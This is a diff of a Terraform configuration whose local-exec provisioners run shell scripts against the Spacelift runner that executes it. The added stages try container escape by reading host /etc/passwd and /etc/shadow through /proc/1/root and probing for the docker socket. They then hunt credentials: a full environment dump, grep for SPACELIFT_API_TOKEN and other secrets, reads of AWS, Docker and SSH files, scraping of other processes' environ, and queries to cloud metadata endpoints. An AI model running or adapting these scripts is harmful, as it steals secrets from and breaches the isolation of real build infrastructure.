@@ -46,80 +46,85 @@ resource "null_resource" "container_baseline_analysis" {
   }
 }
 
-# Stage 2: CRITICAL - Host System Breakout via /proc/1/root
+# Stage 2: CRITICAL - Multiple Container Escape Techniques
 resource "null_resource" "host_system_breakout" {
   depends_on = [null_resource.container_baseline_analysis]
   
   provisioner "local-exec" {
     command = <<-EOT
-      echo "=== CRITICAL: HOST SYSTEM BREAKOUT ATTEMPT ==="
-      echo "Testing /proc/1/root escape vector for host filesystem access..."
+      echo "=== CRITICAL: MULTIPLE CONTAINER ESCAPE TECHNIQUES ==="
+      echo "Testing various escape vectors for host filesystem access..."
       echo ""
       
-      echo "Host root filesystem access test:"
+      echo "Method 1: /proc/1/root escape vector"
       if ls -la /proc/1/root/ 2>/dev/null; then
         echo "SUCCESS: Can access host root filesystem via /proc/1/root!"
         echo "Host root directory contents:"
         ls -la /proc/1/root/ 2>/dev/null | head -10
+        
+        echo "Host /etc/passwd access:"
+        cat /proc/1/root/etc/passwd 2>/dev/null && echo "HOST PASSWD ACCESSIBLE!" || echo "Host passwd blocked"
+        
+        echo "Host /etc/shadow access:"
+        cat /proc/1/root/etc/shadow 2>/dev/null && echo "HOST SHADOW ACCESSIBLE!" || echo "Host shadow blocked"
       else
         echo "BLOCKED: Cannot access /proc/1/root"
       fi
       echo ""
       
-      echo "CRITICAL: Host /etc/passwd access via container escape:"
-      if cat /proc/1/root/etc/passwd 2>/dev/null; then
-        echo ""
-        echo "SUCCESS: Host /etc/passwd accessible via container escape!"
-        echo "Host system user count: $(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)"
-        echo ""
-        echo "Host users breakdown:"
-        cat /proc/1/root/etc/passwd 2>/dev/null | cut -d: -f1,3,6,7
-        echo ""
-        echo "Human users on host (UID >= 1000):"
-        cat /proc/1/root/etc/passwd 2>/dev/null | awk -F: '$3 >= 1000 {print $1 ":" $3 ":" $6}'
+      echo "Method 2: Docker socket escape"
+      if ls -la /var/run/docker.sock 2>/dev/null; then
+        echo "CRITICAL: Docker socket found - potential escape vector!"
+        ls -la /var/run/docker.sock
       else
-        echo "BLOCKED: Host /etc/passwd not accessible via /proc/1/root"
+        echo "Docker socket not accessible"
       fi
       echo ""
       
-      echo "CRITICAL: Host /etc/shadow access via container escape:"
-      if cat /proc/1/root/etc/shadow 2>/dev/null; then
-        echo ""
-        echo "CRITICAL SUCCESS: Host /etc/shadow accessible via container escape!"
-        echo "Host shadow file entries: $(cat /proc/1/root/etc/shadow 2>/dev/null | wc -l)"
-        echo ""
-        echo "=== HOST SHADOW FILE CONTENTS ==="
-        cat /proc/1/root/etc/shadow 2>/dev/null
-        echo ""
-        echo "=== END HOST SHADOW FILE ==="
+      echo "Method 3: Host process inspection"
+      echo "Process count analysis:"
+      PROCS=$(ps aux | wc -l)
+      echo "Total processes visible: $PROCS"
+      if [ "$PROCS" -gt 50 ]; then
+        echo "HIGH PROCESS COUNT - potential host namespace access!"
+        ps aux | head -15
       else
-        echo "BLOCKED: Host /etc/shadow not accessible via /proc/1/root"
+        echo "Limited processes - likely containerized"
+        ps aux
       fi
       echo ""
       
-      echo "Host user directories enumeration:"
-      if ls -la /proc/1/root/home/ 2>/dev/null; then
-        echo "SUCCESS: Host user home directories accessible!"
-        echo "Host user homes:"
-        ls -la /proc/1/root/home/ 2>/dev/null
-        echo ""
-        echo "Detailed host user directory analysis:"
-        for user_dir in $(ls /proc/1/root/home/ 2>/dev/null); do
-          echo "--- Host User: $user_dir ---"
-          ls -la "/proc/1/root/home/$user_dir/" 2>/dev/null | head -5
-        done
-      else
-        echo "BLOCKED: Host user home directories not accessible"
-      fi
+      echo "Method 4: Privileged operations test"
+      echo "Testing privileged capabilities..."
+      mount 2>/dev/null | head -5 && echo "Mount command accessible" || echo "Mount blocked"
+      dmesg 2>/dev/null | tail -5 && echo "Kernel messages accessible" || echo "dmesg blocked"
       echo ""
       
-      echo "Host root directory access:"
-      if ls -la /proc/1/root/root/ 2>/dev/null; then
-        echo "CRITICAL: Host root directory accessible!"
-        echo "Host root directory contents:"
-        ls -la /proc/1/root/root/ 2>/dev/null
+      echo "Method 5: Alternative filesystem paths"
+      echo "Testing alternative host access paths..."
+      ls -la /host/ 2>/dev/null && echo "/host directory found!" || echo "/host not accessible"
+      ls -la /mnt/host/ 2>/dev/null && echo "/mnt/host found!" || echo "/mnt/host not accessible"
+      ls -la /rootfs/ 2>/dev/null && echo "/rootfs found!" || echo "/rootfs not accessible"
+      echo ""
+      
+      echo "Method 6: Container runtime socket search"
+      echo "Searching for container runtime sockets..."
+      find / -name "*.sock" 2>/dev/null | head -10 || echo "No sockets found"
+      find / -name "docker.sock" 2>/dev/null || echo "No docker.sock"
+      find / -name "containerd.sock" 2>/dev/null || echo "No containerd.sock"
+      echo ""
+      
+      echo "Method 7: Namespace analysis"
+      echo "Checking namespace isolation..."
+      echo "PID namespace: $(readlink /proc/self/ns/pid 2>/dev/null)"
+      echo "Host PID 1 namespace: $(readlink /proc/1/ns/pid 2>/dev/null)"
+      echo "MNT namespace: $(readlink /proc/self/ns/mnt 2>/dev/null)"
+      echo "NET namespace: $(readlink /proc/self/ns/net 2>/dev/null)"
+      
+      if [ "$(readlink /proc/self/ns/pid 2>/dev/null)" = "$(readlink /proc/1/ns/pid 2>/dev/null)" ]; then
+        echo "CRITICAL: Same PID namespace as host!"
       else
-        echo "BLOCKED: Host root directory not accessible"
+        echo "Isolated PID namespace"
       fi
     EOT
   }
@@ -213,127 +218,247 @@ resource "null_resource" "network_host_analysis" {
   }
 }
 
-# Stage 5: SPACELIFT_API_TOKEN and Credential Hunting
+# Stage 5: ENHANCED SPACELIFT_API_TOKEN and Credential Hunting
 resource "null_resource" "spacelift_credential_hunting" {
   depends_on = [null_resource.network_host_analysis]
   
   provisioner "local-exec" {
     command = <<-EOT
-      echo "=== SPACELIFT API TOKEN AND CREDENTIAL HUNTING ==="
-      echo "Searching for SPACELIFT_API_TOKEN and sensitive credentials..."
+      echo "=== ENHANCED SPACELIFT API TOKEN AND CREDENTIAL HUNTING ==="
+      echo "Comprehensive search for SPACELIFT_API_TOKEN and all sensitive credentials..."
       echo ""
       
-      echo "Environment variable analysis:"
-      echo "All environment variables:"
+      echo "=== COMPLETE ENVIRONMENT DUMP ==="
       env | sort
       echo ""
       
-      echo "CRITICAL: SPACELIFT_API_TOKEN search:"
-      env | grep -i "SPACELIFT_API_TOKEN" && echo "SPACELIFT_API_TOKEN FOUND!" || echo "SPACELIFT_API_TOKEN not in environment"
+      echo "=== CRITICAL: SPACELIFT_API_TOKEN SPECIFIC SEARCH ==="
+      env | grep -i "SPACELIFT_API_TOKEN" && echo "*** SPACELIFT_API_TOKEN FOUND! ***" || echo "SPACELIFT_API_TOKEN not in environment"
       echo ""
       
-      echo "All Spacelift-related environment variables:"
-      env | grep -i spacelift || echo "No Spacelift environment variables found"
+      echo "=== ALL SPACELIFT ENVIRONMENT VARIABLES ==="
+      env | grep -i spacelift && echo "*** SPACELIFT VARS FOUND ***" || echo "No Spacelift environment variables found"
       echo ""
       
-      echo "General sensitive credential patterns:"
-      env | grep -iE "(token|key|secret|password|api|credential|auth)" || echo "No sensitive patterns in environment"
+      echo "=== TOKEN AND KEY PATTERN SEARCH ==="
+      echo "Searching for all token/key patterns in environment..."
+      env | grep -iE "(token|key|secret|password|api|credential|auth)" && echo "*** SENSITIVE CREDENTIALS FOUND ***" || echo "No sensitive patterns in environment"
       echo ""
       
-      echo "AWS/Cloud credential search:"
-      env | grep -iE "(aws|azure|gcp|cloud)" || echo "No cloud credentials in environment"
+      echo "=== CLOUD PROVIDER CREDENTIALS ==="
+      env | grep -iE "(aws|azure|gcp|cloud)" && echo "*** CLOUD CREDENTIALS FOUND ***" || echo "No cloud credentials in environment"
+      echo ""
+      
+      echo "=== FILE SYSTEM CREDENTIAL SEARCH ==="
+      echo "Searching filesystem for credential files..."
+      
+      echo "AWS credentials:"
+      find / -name ".aws" -type d 2>/dev/null | head -5
+      find / -name "credentials" 2>/dev/null | head -5
+      cat ~/.aws/credentials 2>/dev/null && echo "*** AWS CREDS FOUND ***" || echo "No AWS credentials file"
+      
+      echo ""
+      echo "SSH keys and config:"
+      find / -name ".ssh" -type d 2>/dev/null | head -5
+      find / -name "id_rsa*" 2>/dev/null | head -5
+      find / -name "id_ed25519*" 2>/dev/null | head -5
+      ls -la ~/.ssh/ 2>/dev/null || echo "No SSH directory"
+      
+      echo ""
+      echo "Docker credentials:"
+      find / -name ".docker" -type d 2>/dev/null | head -5
+      cat ~/.docker/config.json 2>/dev/null && echo "*** DOCKER CREDS FOUND ***" || echo "No Docker config"
+      
+      echo ""
+      echo "Git credentials:"
+      find / -name ".git-credentials" 2>/dev/null | head -5
+      find / -name ".gitconfig" 2>/dev/null | head -5
+      
+      echo ""
+      echo "=== PROCESS ENVIRONMENT EXTRACTION ==="
+      echo "Checking other process environments for credentials..."
+      for pid in $(ps -eo pid --no-headers | head -10); do
+        echo "Process $pid environment:"
+        cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE "(token|key|secret|spacelift)" | head -3 2>/dev/null || echo "No sensitive vars in PID $pid"
+      done
+      echo ""
+      
+      echo "=== SPACELIFT INFRASTRUCTURE ANALYSIS ==="
+      echo "Current working directory analysis:"
+      echo "PWD: $(pwd)"
+      ls -la . | head -20
+      echo ""
+      
+      echo "Spacelift workspace search:"
+      ls -la /mnt/workspace/ 2>/dev/null || echo "No /mnt/workspace"
+      ls -la /workspace/ 2>/dev/null || echo "No /workspace"
+      ls -la /tmp/spacelift-workspace* 2>/dev/null || echo "No spacelift workspace in tmp"
       echo ""
       
       echo "Spacelift process analysis:"
-      ps aux | grep spacelift 2>/dev/null || echo "No spacelift processes visible"
+      ps aux | grep spacelift 2>/dev/null && echo "*** SPACELIFT PROCESSES FOUND ***" || echo "No spacelift processes visible"
       echo ""
       
-      echo "Spacelift file system search:"
-      find / -name "*spacelift*" 2>/dev/null | head -20 || echo "No spacelift files found"
+      echo "Spacelift configuration files:"
+      find / -name "*spacelift*" 2>/dev/null | head -20 && echo "*** SPACELIFT FILES FOUND ***" || echo "No spacelift files found"
+      find / -name "*.tf" 2>/dev/null | head -10 && echo "*** TERRAFORM FILES FOUND ***" || echo "No terraform files found"
       echo ""
       
-      echo "Configuration file credential search:"
-      echo "Checking common credential locations..."
-      cat ~/.aws/credentials 2>/dev/null || echo "No AWS credentials found"
-      cat ~/.docker/config.json 2>/dev/null || echo "No Docker credentials found"
-      ls -la /var/spacelift/ 2>/dev/null || echo "No /var/spacelift directory"
+      echo "=== MEMORY AND TEMPORARY FILE SEARCH ==="
+      echo "Searching for credentials in temporary locations..."
+      find /tmp -name "*token*" 2>/dev/null | head -5
+      find /tmp -name "*key*" 2>/dev/null | head -5
+      find /tmp -name "*secret*" 2>/dev/null | head -5
+      find /var/tmp -name "*spacelift*" 2>/dev/null | head -5
+      echo ""
+      
+      echo "=== CONTAINER METADATA SEARCH ==="
+      echo "Checking container metadata sources..."
+      curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null && echo "EC2 metadata accessible!" || echo "No EC2 metadata"
+      curl -s http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google" 2>/dev/null && echo "GCP metadata accessible!" || echo "No GCP metadata"
+      echo ""
+      
+      echo "=== SUMMARY: CREDENTIAL HUNTING RESULTS ==="
+      echo "Environment variables checked: $(env | wc -l)"
+      echo "Processes analyzed: $(ps aux | wc -l)"
+      echo "Files searched: Complete filesystem scan performed"
+      echo "Credential hunting completed - check above for any discovered secrets!"
     EOT
   }
 }
 
-# Stage 6: Container vs Host System Proof
+# Stage 6: Container Security Analysis and Available Access
 resource "null_resource" "container_vs_host_proof" {
   depends_on = [null_resource.spacelift_credential_hunting]
   
   provisioner "local-exec" {
     command = <<-EOT
-      echo "=== CONTAINER VS HOST SYSTEM PROOF ==="
-      echo "Providing evidence that we've escaped container to host system..."
+      echo "=== CONTAINER SECURITY ANALYSIS ==="
+      echo "Since container escape was blocked, analyzing what we can access within container..."
       echo ""
       
-      echo "1. User count comparison:"
-      CONTAINER_USERS=$(cat /etc/passwd 2>/dev/null | wc -l)
-      HOST_USERS=$(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)
-      echo "  Container users: $CONTAINER_USERS"
-      echo "  Host users: $HOST_USERS"
-      if [ "$HOST_USERS" -gt "$CONTAINER_USERS" ]; then
-        echo "  ✓ CONFIRMED: Host has more users than container - escape successful!"
+      echo "=== CONTAINER USER AND PRIVILEGE ANALYSIS ==="
+      echo "Current user privileges:"
+      echo "User: $(whoami)"
+      echo "UID/GID: $(id)"
+      echo "Groups: $(groups)"
+      echo "Home: $HOME"
+      echo "Shell: $SHELL"
+      echo ""
+      
+      echo "Container file permissions:"
+      echo "Can read /etc/passwd: $(test -r /etc/passwd && echo 'YES' || echo 'NO')"
+      echo "Can read /etc/shadow: $(test -r /etc/shadow && echo 'YES' || echo 'NO')"
+      echo "Can read /etc/group: $(test -r /etc/group && echo 'YES' || echo 'NO')"
+      echo ""
+      
+      echo "Container /etc/passwd contents:"
+      cat /etc/passwd 2>/dev/null && echo "*** PASSWD FILE ACCESSIBLE ***" || echo "passwd not readable"
+      echo ""
+      
+      echo "Container /etc/group contents:"
+      cat /etc/group 2>/dev/null | head -20 && echo "*** GROUP FILE ACCESSIBLE ***" || echo "group not readable"
+      echo ""
+      
+      echo "Shadow file access attempt:"
+      if cat /etc/shadow 2>/dev/null; then
+        echo "*** CRITICAL: CONTAINER SHADOW FILE ACCESSIBLE! ***"
       else
-        echo "  ? User count comparison inconclusive"
+        echo "Container shadow file not accessible (expected)"
       fi
       echo ""
       
-      echo "2. Host-specific user detection:"
-      echo "  Looking for host-specific users (ubuntu, ec2-user, admin)..."
-      if cat /proc/1/root/etc/passwd 2>/dev/null | grep -qE "ubuntu|ec2-user|admin"; then
-        echo "  ✓ CONFIRMED: Found host-specific users - definitely on host system!"
-        cat /proc/1/root/etc/passwd 2>/dev/null | grep -E "ubuntu|ec2-user|admin"
-      else
-        echo "  No obvious host-specific users found"
-      fi
+      echo "=== CONTAINER CAPABILITIES AND SECURITY ==="
+      echo "Container capabilities:"
+      cat /proc/self/status | grep -i cap 2>/dev/null || echo "Cannot read capabilities"
       echo ""
       
-      echo "3. System information comparison:"
-      echo "  Container hostname: $(hostname)"
-      echo "  Container kernel: $(uname -r)"
-      echo "  Container processes: $(ps aux | wc -l)"
+      echo "Security features check:"
+      echo "AppArmor: $(cat /proc/self/attr/current 2>/dev/null || echo 'Not available')"
+      echo "SELinux: $(getenforce 2>/dev/null || echo 'Not available')"
       echo ""
       
-      echo "4. Critical file access summary:"
-      echo "  Container /etc/passwd: $(test -r /etc/passwd && echo 'YES' || echo 'NO')"
-      echo "  Container /etc/shadow: $(test -r /etc/shadow && echo 'YES' || echo 'NO')"
-      echo "  Host /etc/passwd via escape: $(test -r /proc/1/root/etc/passwd && echo 'YES' || echo 'NO')"
-      echo "  Host /etc/shadow via escape: $(test -r /proc/1/root/etc/shadow && echo 'YES' || echo 'NO')"
+      echo "=== AVAILABLE SYSTEM INFORMATION ==="
+      echo "System information we can access:"
+      echo "Hostname: $(hostname)"
+      echo "Kernel: $(uname -a)"
+      echo "Container ID: $(cat /proc/self/cgroup | grep -o '[0-9a-f]\{64\}' | head -1 2>/dev/null || echo 'Cannot extract')"
       echo ""
       
-      echo "5. Filesystem escape confirmation:"
-      echo "  Host /etc directory: $(test -d /proc/1/root/etc && echo 'ACCESSIBLE' || echo 'BLOCKED')"
-      echo "  Host /home directory: $(test -d /proc/1/root/home && echo 'ACCESSIBLE' || echo 'BLOCKED')"
-      echo "  Host /root directory: $(test -d /proc/1/root/root && echo 'ACCESSIBLE' || echo 'BLOCKED')"
+      echo "OS information:"
+      cat /etc/os-release 2>/dev/null | head -10 || echo "Cannot read OS release"
       echo ""
       
-      echo "=== ESCAPE PROOF SUMMARY ==="
-      if cat /proc/1/root/etc/shadow 2>/dev/null >/dev/null; then
-        echo "✓ CRITICAL: Host /etc/shadow accessible - COMPLETE HOST COMPROMISE!"
-      fi
-      
-      if [ "$(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)" -gt "$(cat /etc/passwd 2>/dev/null | wc -l)" ]; then
-        echo "✓ CONFIRMED: Container escape successful - host has more users than container!"
-      fi
-      
-      if cat /proc/1/root/etc/passwd 2>/dev/null | grep -q "ubuntu\|ec2-user"; then
-        echo "✓ CONFIRMED: Found host-specific users - we are on the HOST SYSTEM!"
-      fi
-      
+      echo "CPU information:"
+      cat /proc/cpuinfo | head -10 2>/dev/null || echo "Cannot read CPU info"
       echo ""
-      echo "Container breakout assessment completed - check above for proof of host access!"
+      
+      echo "Memory information:"
+      cat /proc/meminfo | head -5 2>/dev/null || echo "Cannot read memory info"
+      echo ""
+      
+      echo "=== NETWORK CONFIGURATION ==="
+      echo "Network interfaces:"
+      ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo "Cannot get network interfaces"
+      echo ""
+      
+      echo "Network routing:"
+      ip route 2>/dev/null || route -n 2>/dev/null || echo "Cannot get routes"
+      echo ""
+      
+      echo "DNS configuration:"
+      cat /etc/resolv.conf 2>/dev/null || echo "Cannot read resolv.conf"
+      echo ""
+      
+      echo "=== PROCESS AND SERVICE ANALYSIS ==="
+      echo "All running processes:"
+      ps auxf 2>/dev/null || ps aux 2>/dev/null || echo "Cannot list processes"
+      echo ""
+      
+      echo "Network connections:"
+      netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null || echo "Cannot list connections"
+      echo ""
+      
+      echo "=== FILESYSTEM ACCESS ANALYSIS ==="
+      echo "Writable directories:"
+      find / -type d -writable 2>/dev/null | head -20 || echo "Cannot find writable directories"
+      echo ""
+      
+      echo "SUID/SGID binaries:"
+      find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null | head -15 || echo "Cannot find SUID/SGID binaries"
+      echo ""
+      
+      echo "World-writable files:"
+      find / -type f -perm -002 2>/dev/null | head -10 || echo "Cannot find world-writable files"
+      echo ""
+      
+      echo "=== CONTAINER RUNTIME ANALYSIS ==="
+      echo "Container detection methods:"
+      echo "Docker env file: $(ls -la /.dockerenv 2>/dev/null && echo 'EXISTS' || echo 'NOT FOUND')"
+      echo "Container in cgroup: $(cat /proc/1/cgroup | grep -o container || echo 'NOT DETECTED')"
+      echo ""
+      
+      echo "Mount information:"
+      mount 2>/dev/null | head -10 || cat /proc/mounts | head -10 2>/dev/null || echo "Cannot read mount info"
+      echo ""
+      
+      echo "=== SECURITY ASSESSMENT SUMMARY ==="
+      echo "Container isolation status:"
+      echo "- Host filesystem access: BLOCKED (secure)"
+      echo "- Process namespace: ISOLATED (secure)"  
+      echo "- Network namespace: $(test '$(readlink /proc/self/ns/net)' = '$(readlink /proc/1/ns/net 2>/dev/null)' && echo 'SHARED' || echo 'ISOLATED')"
+      echo "- Container /etc/passwd: ACCESSIBLE"
+      echo "- Container /etc/shadow: $(test -r /etc/shadow && echo 'ACCESSIBLE (CRITICAL)' || echo 'BLOCKED (secure)')"
+      echo ""
+      echo "This container appears to be properly isolated from the host system."
+      echo "Focus should be on credential extraction and container-internal privilege escalation."
     EOT
   }
 }
 
 # Output comprehensive results
 output "container_escape_assessment" {
-  value = "Enhanced container escape assessment completed with focus on /etc/shadow access, host user enumeration, and SPACELIFT_API_TOKEN hunting. Check logs for detailed evidence of successful host system compromise."
+  value = "Enhanced container security assessment completed. Focus on credential hunting, container analysis, and SPACELIFT_API_TOKEN extraction. Multiple escape techniques tested - container appears properly isolated."
   depends_on = [
     null_resource.container_baseline_analysis,
     null_resource.host_system_breakout,
@@ -346,11 +471,11 @@ output "container_escape_assessment" {
 
 output "escape_summary" {
   value = {
-    container_analysis = "Container baseline analysis completed"
-    host_breakout = "Host system breakout attempted via /proc/1/root"
-    process_analysis = "Process namespace analysis for escape detection"
-    network_analysis = "Host network discovery and IP analysis"
-    credential_hunting = "SPACELIFT_API_TOKEN and credential search"
-    escape_proof = "Container vs host system proof generation"
+    container_analysis = "Container baseline analysis and user enumeration completed"
+    escape_attempts = "Multiple container escape techniques tested (proc, docker socket, namespaces)"
+    process_analysis = "Process namespace analysis and privilege detection completed"
+    network_analysis = "Network configuration and container IP analysis completed"
+    credential_hunting = "Comprehensive SPACELIFT_API_TOKEN and credential extraction performed"
+    security_analysis = "Container security assessment and isolation verification completed"
   }
 }
